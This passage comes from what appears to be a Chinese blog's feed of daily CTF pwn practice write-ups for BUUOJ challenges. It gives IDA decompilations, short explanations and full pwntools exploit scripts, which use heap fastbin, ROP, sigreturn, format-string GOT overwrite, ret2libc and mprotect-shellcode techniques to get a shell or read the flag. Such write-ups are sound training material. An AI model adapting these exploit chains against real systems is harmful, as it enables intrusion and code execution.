Allocate(size):    sh.recvuntil("Command: ")    sh.sendline("1")    sh.recvuntil("Size: ")    sh.sendline(str(size))def fill(index,content):    sh.recvuntil("Command: ")    sh.sendline("2")    sh.recvuntil("Index: ")    sh.sendline(str(index))    sh.recvuntil("Size: ")    sh.sendline(str(len(content)))    sh.recvuntil("Content: ")    sh.sendline(content)def free(index):    sh.recvuntil("Command: ")    sh.sendline("3")    sh.recvuntil("Index: ")    sh.sendline(str(index))def dump(index):    sh.recvuntil("Command: ")    sh.sendline("4")    sh.recvuntil("Index: ")    sh.sendline(str(index))        sh.recvline()    return sh.recvline()def pwn(ip,port,debug):    global sh    if debug==1:        sh=process(proc)    else:        sh=remote(ip,port)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)    payload = p64(0)*3    payload += p64(0x21)    payload += p64(0)*3    payload += p64(0x21)    payload += p8(0x80)    fill(0, payload)    payload = p64(0)*3    payload += p64(0x21)    fill(3, payload)    Allocate(0x10)    Allocate(0x10)    payload = p64(0)*3    payload += p64(0x91)    fill(3, payload)    Allocate(0x80)    free(4)    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78    log.info("libc_base: "+hex(libc_base))    Allocate(0x60)    free(4)    payload = p64(libc_base+0x3c4aed)    fill(2, payload)    Allocate(0x60)    Allocate(0x60)    payload = p8(0)*3    payload += p64(0)*2    one_gadget=0x4526a    payload += p64(libc_base+one_gadget)    fill(6, payload)    Allocate(255)    sh.sendline("cat flag")    sh.interactive()if __name__=="__main__":    pwn("node3.buuoj.cn",25187,0)</code></pre><p>其实这题还是有些疑问，但都是基础问题，我会总结到另一篇Fastbin attack中</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWn练习-Day07</title>
      <link href="/2020/03/19/ctf/pwn/day07/"/>
      <url>/2020/03/19/ctf/pwn/day07/</url>
      
        <content type="html"><![CDATA[<h1 id="Day07"><a href="#Day07" class="headerlink" title="Day07"></a>Day07</h1><p>跟前几天类型一样的入门，就不放解析了，直接放exp了</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x10-HarekazeCTF2019-baby-rop"><a href="#0x10-HarekazeCTF2019-baby-rop" class="headerlink" title="0x10 [HarekazeCTF2019]baby_rop"></a>0x10 [HarekazeCTF2019]baby_rop</h2><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *# p=process("./babyrop")context.log_level="debug"p=remote("node3.buuoj.cn",25073)# 0x0000000000400683 : pop rdi ; retsystem=0x0000000000400490bin_sh=0x0000000000601048pop_rdi=0x0000000000400683payload="a"*24  +  p64(pop_rdi)  + p64(bin_sh) + p64(system) p.recvuntil("What's your name? ")p.sendline(payload)p.sendline("cat /home/babyrop/flag")p.interactive()</code></pre><h2 id="0x20-jarvisoj-level0"><a href="#0x20-jarvisoj-level0" class="headerlink" title="0x20 jarvisoj_level0"></a>0x20 jarvisoj_level0</h2><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *# p=process("./level0")p=remote("node3.buuoj.cn",27725)system=0x0000400596payload='a'*136 + p64(system)p.recvuntil("Hello, World\n")p.sendline(payload)p.sendline("cat flag")p.interactive()</code></pre><h2 id="0x30-ciscn-2019-s-3"><a href="#0x30-ciscn-2019-s-3" class="headerlink" title="0x30 ciscn_2019_s_3"></a>0x30 ciscn_2019_s_3</h2><p>题目来源：buuoj</p><p>考点：ROP</p><p>题目难度：中等</p><p>64位动态链接库文件，开启了NX保护</p><p>ida反汇编:</p><pre class=" language-lang-c"><code class="language-lang-c">signed __int64 vuln(){  signed __int64 result; // rax  __asm { syscall; LINUX - sys_read }  result = 1LL;  __asm { syscall; LINUX - sys_write }  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">signed __int64 gadgets(){  return 15LL;}</code></pre><p>给了个gadgets函数可能会有用</p><p>程序一开始没看太懂，不会了，又学到东西了</p><p>两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。<br>还有一个gadget函数。</p><p>有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200319204042.png" alt=""></p><p>15 sys_rt_sigreturn<br>59 sys_execve</p><p><strong>解法一</strong><br>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p><p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *io=process('pwn')main=0x0004004EDexecv=0x04004E2pop_rdi=0x4005a3pop_rbx_rbp_r12_r13_r14_r15=0x40059Amov_rdxr13_call=0x0400580 sys=0x00400517pl1='/bin/sh\x00'*2+p64(main)io.send(pl1)io.recv(0x20)sh=u64(io.recv(8))-280print(hex(sh))pl2='/bin/sh\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)*2+p64(sh+0x50)+p64(0)*3pl2+=p64(mov_rdxr13_call)+p64(execv)pl2+=p64(pop_rdi)+p64(sh)+p64(sys)io.send(pl2)io.interactive()</code></pre><p>这个解法倒是很容易就理解了，这解法二就牛了</p><p><strong>解法2</strong><br>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。<br>具体可参考：<a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">Framing Signals—A Return to Portable Shellcode</a></p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *io=process('pwn')context.binary='./pwn'context.terminal = ['gnome-terminal','-x','sh','-c']main=0x0004004EDsigret=0x4004DAsys=0x400517pl1='/bin/sh\x00'*2+p64(main)io.send(pl1)io.recv(0x20)sh=u64(io.recv(8))-280print(hex(sh))frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = shframe.rsi = 0frame.rdx = 0frame.rip = syspl1='a'*16+p64(sigret)+p64(sys)+str(frame)'''def debug(addr):    raw_input('debug:')    gdb.attach(io, "b *" + addr)debug('0x400514')'''pl2='/bin/sh\x00'*2+p64(sigret)+p64(sys)+str(frame)io.send(pl2)io.interactive()</code></pre><p>我是没看太懂，先放在这里，有时间再来补充一下</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day05</title>
      <link href="/2020/03/18/ctf/pwn/day05/"/>
      <url>/2020/03/18/ctf/pwn/day05/</url>
      
        <content type="html"><![CDATA[<h1 id="Day05"><a href="#Day05" class="headerlink" title="Day05"></a>Day05</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>睡过头了，，，但题还是要刷的</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x10-第五空间2019-决赛-PWN5"><a href="#0x10-第五空间2019-决赛-PWN5" class="headerlink" title="0x10 [第五空间2019 决赛]PWN5"></a>0x10 [第五空间2019 决赛]PWN5</h2><p>题目来源：buuoj</p><p>考点：格式化字符串漏洞的利用</p><p>难度：简单</p><p>拿到文件后我们发现，这是一个32位的程序，开启了NX保护</p><p>ida反汇编主要函数:</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int a1){  unsigned int v1; // eax  int fd; // ST14_4  int result; // eax  char nptr; // [esp+4h] [ebp-80h]  char buf; // [esp+14h] [ebp-70h]  unsigned int v6; // [esp+78h] [ebp-Ch]  int *v7; // [esp+7Ch] [ebp-8h]  v7 = &a1;  v6 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  v1 = time(0);  srand(v1);  fd = open("/dev/urandom", 0);  read(fd, &unk_804C044, 4u);  printf("your name:");  read(0, &buf, 0x63u);  printf("Hello,");  printf(&buf);  printf("your passwd:");  read(0, &nptr, 0xFu);  if ( atoi(&nptr) == unk_804C044 )  {    puts("ok!!");    system("/bin/sh");  }  else  {    puts("fail");  }  result = 0;  if ( __readgsdword(0x14u) != v6 )    sub_80493D0();  return result;}</code></pre><p>程序就一个主函数，其功能大概是：读取一个随机字符串到&amp;unk_804C044 ，然后让我们输入name,并将它打印出来，然后让我们输入密码，我们输入的密码会与&amp;unk_804C044 做对比，相等就执行system(“/bin/sh”),不等就结束。</p><p>也就是说我们想要执行system(“/bin/sh”),需要让atoi(&amp;nptr) == unk_804C044，如果我们运气好，四位随机数一次性猜对，就可以取得shell了，但很明显，我运气不好。</p><p>而我们的read()函数并不存在溢出，因此想要覆盖unk_804C044，就基本不太可能了，但这个时候我们发现</p><pre class=" language-lang-c"><code class="language-lang-c">  printf("your name:");  read(0, &buf, 0x63u);  printf("Hello,");  printf(&buf);# 直接打印&buf ,导致我们可以输入%s,等这类的格式化字符串，泄露出地址</code></pre><p>典型的格式化字符串出现了我们可以通过：</p><p>填充%x来获取栈上存储的值，这里利用别人的脚本来获取一下偏移</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *def pianyi(pwn_name,x = 'x'):    print('pwn_name=' + pwn_name + ',x=' + x)    i = 0    while True :        r = process(pwn_name)         i += 1        payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'        r.sendline(payload)        r.recvuntil("aaaa.")        r_recv = r.recv(8)        print('*'*10 + r_recv + '*'*10)        if r_recv == '61616161':            print(payload)            if x == 'x':                s = '%' + str(i) + '$8x'            else :                s = '%' + str(i) + '$8' + str(x)            return s            breakif __name__=='__main__':    pianyi("./pwn")</code></pre><p>输出：</p><pre class=" language-lang-txt"><code class="language-lang-txt">**********61616161**********aaaa.%10$8x</code></pre><p>这里解释一下 <code>%n$x</code> 的意思是获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了，其实也就是 <code>%x</code> 的一种形式</p><p>算出来偏移以后，根据我们前面介绍的知识点</p><p>但根据我们前面的知识，我们就可以发现，这道题的解法不止一种</p><p>1.利用%n,修改unk_804C044 中的数据，利用程序所给的system(‘/bin/sh’)，也是针对这道题的解法</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *io=process('./pwn')addr=0x0804C044payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)payload+='%10$hhn%11$hhn%12$hhn%13$hhn'io.sendline(payload)payload=str(0x10101010)io.sendline(payload)io.interactive()</code></pre><p>解释下payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">  read(fd, &unk_804C044, 4u);读取了四个字节到了&unk_804C044,</code></pre><p>而根据我们前面介绍的 <code>%n</code> 的作用我们可以知道 <code>%10$hhn</code>  可以做到将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，而%n 之前打印的字符个数就是我们算的偏移量，也就是10，%后跟的数字是定位用参数位置的用的</p><p>而我们的payload给到printf(&amp;buf)后会变成这个样子</p><pre class=" language-lang-c"><code class="language-lang-c">printf(&unk_804C044,&unk_804C045,&unk_804C046,&unk_804C047,%10$hhn%11$hhn%12$hhn%13$hhn)</code></pre><p>而 <code>%10$hhn</code> 所指向的地址就是&amp;unk_804C044，也就是把10赋值给了&amp;unk_804C044，同理执行完后：</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200317204315.png" alt=""></p><p>我们可以看到，&amp;unk_804C044的值已经被我们修改为 0x10101010了，然后我们就可以getshell了。</p><p>这个方法只对本题适合使用，有没有方法可以通吃呢，</p><p>当然有</p><p>2.泄露got表，修改函数执行</p><p>原理：由于延迟绑定技术，只有在程序中执行过的函数，got中才会绑定其真实地址，所以要泄露的时漏洞之前已经执行过的函数</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *p=process('./pwn1')# p=remote('node2.buuoj.cn.wetolink.com',28910)elf=ELF('./pwn1')def debug():    pwnlib.gdb.attach(p)    pause();offset=10system_addr=0x08049080read_addr=elf.got['read']atio=elf.got['atoi']p.recvuntil(':')payload1=fmtstr_payload(offset,{atio:system_addr})p.sendline(payload1)p.recvuntil('your passwd:')p.sendline('/bin/sh\x00')'''p.sendline(payload1)p.recvuntil('Hello,')p.recvuntil('\x08')rec=u32(p.recv(4).ljust(4,'\x00'))log.success('rec: '+hex(rec))p.recvuntil('your passwd:')p.sendline(p32(rec))'''p.interactive()</code></pre><p>这个脚本不是我写的，但我觉很nice，一看就懂了，特别是这行payload,</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1=fmtstr_payload(offset,{atio:system_addr})</code></pre><p>真就是小母牛进了公牛圈，简单明了</p><h2 id="0x20-ciscn-2019-n-8"><a href="#0x20-ciscn-2019-n-8" class="headerlink" title="0x20 ciscn_2019_n_8"></a>0x20 ciscn_2019_n_8</h2><p>题目来源：buuoj</p><p>考点：QWORD</p><p>难度：入门</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_n_8: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=44b5b2d71c377819ef3c53a4511038cd2b25a368, for GNU/Linux 3.2.0, not stripped</code></pre><p>32位动态链接库文件</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>芜湖，起飞，除了RELRO 保护全开了</p><p>ida 反汇编分析：</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [esp-14h] [ebp-20h]  int v5; // [esp-10h] [ebp-1Ch]  var[13] = 0;  var[14] = 0;  init();  puts("What's your name?");  __isoc99_scanf("%s", var, v4, v5);  if ( *&var[13] )  {    if ( *&var[13] == 17LL )      system("/bin/sh");    else      printf(        "something wrong! val is %d",        var[0],        var[1],        var[2],        var[3],        var[4],        var[5],        var[6],        var[7],        var[8],        var[9],        var[10],        var[11],        var[12],        var[13],        var[14]);  }  else  {    printf("%s, Welcome!\n", var);    puts("Try do something~");  }  return 0;}</code></pre><p>var可以看做是一个int型的数组，根据源码得到(_QWORD)&amp;var[13] == 17就可以得到shell，QWORD是8个字节(即：4个字符)，所以意思是要将var[13]之后的8个字节的数据赋值为17，也就是第13*4后面的那个控制为17即可</p><p>虽然保护基本上全开了，但这题不难，，，</p><p>直接exp走起</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python #-*-coding:utf-8-*-from pwn import *#p = process('./ciscn_2019_n_8')p=remote("node3.buuoj.cn",25882)payload="a"*13*4+p64(17)+"a"p.sendlineafter("What's your name?", payload)p.sendline("cat flag")p.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day04</title>
      <link href="/2020/03/17/ctf/pwn/day04/"/>
      <url>/2020/03/17/ctf/pwn/day04/</url>
      
        <content type="html"><![CDATA[<h1 id="Day04"><a href="#Day04" class="headerlink" title="Day04"></a>Day04</h1><h2 id="0x10-前言"><a href="#0x10-前言" class="headerlink" title="0x10 前言"></a>0x10 前言</h2><p>今天的两道题，居然有一道跟昨天的重复了，不过第二道题的利用思路我是没想到的</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x10-ciscn-2019-en-2"><a href="#0x10-ciscn-2019-en-2" class="headerlink" title="0x10 ciscn_2019_en_2"></a>0x10 ciscn_2019_en_2</h2><p>题目来源：buuoj.cn</p><p>考点：跟昨天的ciscn_2019_c_1 一毛一样</p><p>难度：跟昨天的ciscn_2019_c_1 一毛一样</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_en_2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</code></pre><p>64位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启NX保护</p><p>ida反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  init(*&argc, argv, envp);  puts("EEEEEEE                            hh      iii                ");  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");  puts("====================================================================");  puts("Welcome to this Encryption machine\n");  begin();  while ( 1 )  {    while ( 1 )    {      fflush(0LL);      v4 = 0;      __isoc99_scanf("%d", &v4);      getchar();      if ( v4 != 2 )        break;      puts("I think you can do it by yourself");      begin();    }    if ( v4 == 3 )    {      puts("Bye!");      return 0;    }    if ( v4 != 1 )      break;    encrypt();    begin();  }  puts("Something Wrong!");  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int begin(){  puts("====================================================================");  puts("1.Encrypt");  puts("2.Decrypt");  puts("3.Exit");  return puts("Input your choice!");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int encrypt(){  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts("Input your Plaintext to be encrypted");  gets(s);  while ( 1 )  {    v0 = x;    if ( v0 >= strlen(s) )      break;    if ( s[x] <= 96 || s[x] > 122 )    {      if ( s[x] <= 64 || s[x] > 90 )      {        if ( s[x] > 47 && s[x] <= 57 )          s[x] ^= 0xCu;      }      else      {        s[x] ^= 0xDu;      }    }    else    {      s[x] ^= 0xEu;    }    ++x;  }  puts("Ciphertext");  return puts(s);}</code></pre><p>这这这，跟昨天那道有什么区别呢？</p><p>上exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *proc="./ciscn_2019_en_2"elf=ELF(proc)def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")    sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh=process(proc)        context.log_level="debug"    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0    ret = 0x4006b9    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    choose(1)    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    sh.recvuntil('\n')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr => {}'.format(hex(puts_leak)))    libc = LibcSearcher('puts', puts_leak)    libc_base = puts_leak - libc.dump('puts')    sys_addr = libc_base + libc.dump('system')    bin_sh_addr = libc_base + libc.dump('str_bin_sh')    #payload2 = 'a' * 88 + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)    ubuntu18_payload='a' * 88 + p64(ret) +p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)    sh.sendline(ubuntu18_payload)    sh.sendline("cat flag")    sh.interactive()if __name__=='__main__':    pwn("node3.buuoj.cn",26418,0)</code></pre><p>ret2libc是一种pwn题通解的解法，这道题一定有其他解法，等我有时间找找官方wp看看</p><h2 id="0x20-get-started-3dsctf-2016"><a href="#0x20-get-started-3dsctf-2016" class="headerlink" title="0x20 get_started_3dsctf_2016"></a>0x20 get_started_3dsctf_2016</h2><p>题目来源：buuoj.cn</p><p>考点：<strong>mprotect</strong>,修改某地址为rwx,ret2text,orw</p><p>难度：简单</p><p>file：</p><pre><code>get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped</code></pre><p>32位静态链接文件</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>程序开启NX保护</p><p>ida 反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-38h]  printf("Qual a palavrinha magica? ", v4);  gets(&v4);  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">void __cdecl get_flag(int a1, int a2){  int v2; // eax  int v3; // esi  unsigned __int8 v4; // al  int v5; // ecx  unsigned __int8 v6; // al  if ( a1 == 814536271 && a2 == 425138641 )  {    v2 = fopen("flag.txt", "rt");    v3 = v2;    v4 = getc(v2);    if ( v4 != 255 )    {      v5 = (char)v4;      do      {        putchar(v5);        v6 = getc(v3);        v5 = (char)v6;      }      while ( v6 != 255 );    }    fclose(v3);  }}</code></pre><p>程序提供了get_flag函数，因此我们通过覆盖ebp，到程序进入if判断的位置就可以了</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'sh=process('./get_started_3dsctf_2016')get_flag_addr=0x80489b8payload='a'* 0x38 +p32(get_flag_addr)sh.sendline(payload)sh.interactive()</code></pre><p>本地读取flag成功，连接到远端就出问题了，读取不到</p><p>估计是文件权限问题，我是垃圾我不会了</p><p>百度了一下，发现了新东西，记录一下：</p><p><strong>mprotect</strong>，修改某地址为rwx，随后写入shellcode，然后getshell</p><pre class=" language-lang-c"><code class="language-lang-c">int mprotect(const void *start, size_t len, int prot);#start是要修改的起始的内存地址#len是修改的长度#prot修改的权限</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *context(arch='i386',os='linux')r=remote('node3.buuoj.cn',25775)elf=ELF('./get_started_3dsctf_2016')mprotect_addr=elf.symbols['mprotect']read_addr=elf.symbols['read']main_addr=elf.symbols['main']ppp3_addr=0x080483b8mpr_start=0x80eb000mpr_len=0x1000mpr_prot=7  #rxw=7shellcode=asm(shellcraft.sh())payload='a'*0x38payload+=p32(mprotect_addr)+p32(ppp3_addr)+p32(mpr_start)+p32(mpr_len)+p32(mpr_prot)payload+=p32(read_addr)+p32(ppp3_addr)+p32(0x0)+p32(mpr_start)+p32(len(shellcode))payload+=p32(mpr_start)r.sendline(payload)r.sendline(shellcode)r.interactive()</code></pre><p><strong>orw</strong>  即:（open read write）</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *io=remote('node3.buuoj.cn', 26518)#io=process('./pwn')#mprotect=0x806EC80 pop3_ret=0x809e4c5pop2_ret=0x806fc31bss=0x80EC000 read=0x806E140op=0x806E0D0 write=0x806E1B0flag=0x80BC388#pl='a'*0x38+p32(mprotect)+p32(pop3_ret)+p32(bss)+p32(0x1000)+p32(7)#pl+=p32(read)+p32(bss)+p32(0)+p32(bss)+p32(0x100)pl='a'*0x38+p32(op)+p32(pop2_ret)+p32(flag)+p32(0)pl+=p32(read)+p32(pop3_ret)+p32(3)+p32(bss)+p32(64)pl+=p32(write)+'dead'+p32(1)+p32(bss)+p32(64)io.sendline(pl)#shellcode=asm(shellcraft.sh())#io.sendline(shellcode)io.interactive()</code></pre><p>第一个看着exp跟那个函数就理解了</p><p>第二个的话，这里说一下</p><pre class=" language-lang-txt"><code class="language-lang-txt">pl='a'*0x38+p32(op)+p32(pop2_ret)+p32(flag)+p32(0)pl+=p32(read)+p32(pop3_ret)+p32(3)+p32(bss)+p32(64)pl+=p32(write)+'dead'+p32(1)+p32(bss)+p32(64)</code></pre><p>我们主要讲解这几行payload:</p><p>第一行：</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload='a'* 0x38 + open("flag.txt") + ebx        ebp的位置</code></pre><p>第二行：</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload=read(3,&addr,64)</code></pre><p>第三行：</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload=write(1,&addr,64)#dead 为retaddr</code></pre><p>连起来就是打开flag.txt，并使用read函数将其读到bss段上，在调用write函数将其打印出来</p><p>TQL~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day03</title>
      <link href="/2020/03/16/ctf/pwn/day03/"/>
      <url>/2020/03/16/ctf/pwn/day03/</url>
      
        <content type="html"><![CDATA[<h1 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h1><h2 id="0x10-前言"><a href="#0x10-前言" class="headerlink" title="0x10 前言"></a>0x10 前言</h2><p>越来越难啦，，，一天真就写了两道题</p><p>PS:这两道题还算有点意思，就放博客上了，前面的没什么意思</p><p>今天就不加入门的RSA玩了</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x20-ciscn-2019-c-1"><a href="#0x20-ciscn-2019-c-1" class="headerlink" title="0x20 ciscn_2019_c_1"></a>0x20 ciscn_2019_c_1</h2><p>题目来源：buuoj.cn </p><p>考点：ret2libc，计算偏移量，18.04在调用system前需要栈对齐</p><p>难度：简单</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</code></pre><p>64位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启了NX，栈数据不可执行</p><p>ida 反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&argc, argv, envp);  puts("EEEEEEE                            hh      iii                ");  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");  puts("====================================================================");  puts("Welcome to this Encryption machine\n");  begin("Welcome to this Encryption machine\n");  while ( 1 )  {    while ( 1 )    {      fflush(0LL);      v4 = 0;      __isoc99_scanf("%d", &v4);      getchar();      if ( v4 != 2 )        break;      puts("I think you can do it by yourself");      begin("I think you can do it by yourself");    }    if ( v4 == 3 )    {      puts("Bye!");      return 0;    }    if ( v4 != 1 )      break;    encrypt("%d", &v4);    